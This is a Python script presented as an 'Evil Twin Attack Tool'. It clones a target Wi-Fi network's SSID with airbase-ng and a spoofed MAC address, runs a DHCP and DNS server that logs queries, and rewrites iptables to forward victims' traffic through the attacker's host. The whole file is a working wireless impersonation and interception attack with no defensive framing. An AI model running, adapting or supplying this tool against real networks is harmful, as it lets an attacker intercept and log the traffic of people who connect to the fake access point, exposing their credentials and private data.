#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import argparse
from threading import Thread

class EvilTwinAttack:
    def __init__(self, interface, target_ssid, channel=None):
        self.interface = interface
        self.target_ssid = target_ssid
        self.channel = channel
        self.ap_process = None
        self.dnsmasq_process = None
        
    def check_dependencies(self):
        """Check if required tools are installed"""
        required_tools = ['airbase-ng', 'dnsmasq', 'iptables']
        missing_tools = []
        
        for tool in required_tools:
            try:
                subprocess.run([tool, '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except FileNotFoundError:
                missing_tools.append(tool)
        
        if missing_tools:
            print(f"[!] Missing required tools: {', '.join(missing_tools)}")
            print("[!] Install them with: apt-get install aircrack-ng dnsmasq iptables")
            return False
        return True
    
    def prepare_interface(self):
        """Prepare the wireless interface for monitoring mode"""
        print(f"[*] Preparing interface {self.interface}...")
        
        # Kill interfering processes
        subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.PIPE)
        
        # Start monitor mode
        result = subprocess.run(['airmon-ng', 'start', self.interface], 
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if result.returncode != 0:
            print("[!] Failed to start monitor mode")
            return False
            
        # Get monitor interface name
        output = result.stdout.decode('utf-8')
        monitor_interface = None
        
        for line in output.split('\n'):
            if 'monitor mode enabled' in line.lower():
                parts = line.split(' ')
                for part in parts:
                    if part.startswith('mon') or part.startswith('wlan'):
                        monitor_interface = part
                        break
        
        if not monitor_interface:
            # Try common naming conventions
            monitor_interface = f"{self.interface}mon"
        
        self.interface = monitor_interface
        print(f"[*] Monitor interface: {self.interface}")
        return True
    
    def create_dnsmasq_config(self):
        """Create dnsmasq configuration file"""
        config_content = f"""
interface={self.interface}
dhcp-range=10.0.0.100,10.0.0.200,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
"""
        
        with open('/tmp/dnsmasq.conf', 'w') as f:
            f.write(config_content)
        
        return '/tmp/dnsmasq.conf'
    
    def setup_networking(self):
        """Configure network interface and iptables"""
        print("[*] Setting up network configuration...")
        
        # Configure the AP interface
        subprocess.run(['ifconfig', 'at0', '10.0.0.1', 'netmask', '255.255.255.0'], 
                      stdout=subprocess.PIPE)
        
        # Enable IP forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        
        # Configure iptables for traffic forwarding
        subprocess.run(['iptables', '--flush'], stdout=subprocess.PIPE)
        subprocess.run(['iptables', '--table', 'nat', '--flush'], stdout=subprocess.PIPE)
        subprocess.run(['iptables', '--delete-chain'], stdout=subprocess.PIPE)
        subprocess.run(['iptables', '--table', 'nat', '--delete-chain'], stdout=subprocess.PIPE)
        
        subprocess.run(['iptables', '--table', 'nat', '--append', 'POSTROUTING', 
                       '--out-interface', self.interface.replace('mon', '')], stdout=subprocess.PIPE)
        subprocess.run(['iptables', '--append', 'FORWARD', '--in-interface', 'at0', 
                       '-j', 'ACCEPT'], stdout=subprocess.PIPE)
        
        print("[*] Network configuration complete")
        return True
    
    def start_access_point(self):
        """Start the evil twin access point"""
        print(f"[*] Starting evil twin AP for SSID: {self.target_ssid}")
        
        cmd = ['airbase-ng', '-a', '00:11:22:33:44:55', '--essid', self.target_ssid]
        
        if self.channel:
            cmd.extend(['-c', str(self.channel)])
        
        cmd.append(self.interface)
        
        self.ap_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Wait a bit for the AP to initialize
        time.sleep(3)
        
        if self.ap_process.poll() is not None:
            print("[!] Failed to start access point")
            return False
            
        print("[*] Access point started")
        return True
    
    def start_dhcp_server(self):
        """Start dnsmasq DHCP server"""
        print("[*] Starting DHCP server...")
        
        config_file = self.create_dnsmasq_config()
        self.dnsmasq_process = subprocess.Popen(['dnsmasq', '-C', config_file], 
                                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        time.sleep(2)
        
        if self.dnsmasq_process.poll() is not None:
            print("[!] Failed to start DHCP server")
            return False
            
        print("[*] DHCP server started")
        return True
    
    def start(self):
        """Start the evil twin attack"""
        if not self.check_dependencies():
            return False
            
        if not self.prepare_interface():
            return False
            
        if not self.setup_networking():
            return False
            
        if not self.start_access_point():
            return False
            
        if not self.start_dhcp_server():
            return False
            
        print(f"[*] Evil twin attack for '{self.target_ssid}' is now running")
        print("[*] Press Ctrl+C to stop the attack")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopping attack...")
            self.stop()
            
        return True
    
    def stop(self):
        """Clean up and stop all processes"""
        if self.ap_process:
            self.ap_process.terminate()
            
        if self.dnsmasq_process:
            self.dnsmasq_process.terminate()
            
        # Restore iptables
        subprocess.run(['iptables', '--flush'], stdout=subprocess.PIPE)
        subprocess.run(['iptables', '--table', 'nat', '--flush'], stdout=subprocess.PIPE)
        
        # Disable IP forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0')
            
        # Stop monitor mode
        subprocess.run(['airmon-ng', 'stop', self.interface], stdout=subprocess.PIPE)
        
        print("[*] Attack stopped and network restored")

def main():
    parser = argparse.ArgumentParser(description="Evil Twin Attack Tool")
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface to use")
    parser.add_argument("-s", "--ssid", required=True, help="Target SSID to clone")
    parser.add_argument("-c", "--channel", type=int, help="Channel to use (optional)")
    
    args = parser.parse_args()
    
    attack = EvilTwinAttack(args.interface, args.ssid, args.channel)
    attack.start()

if __name__ == "__main__":
    main()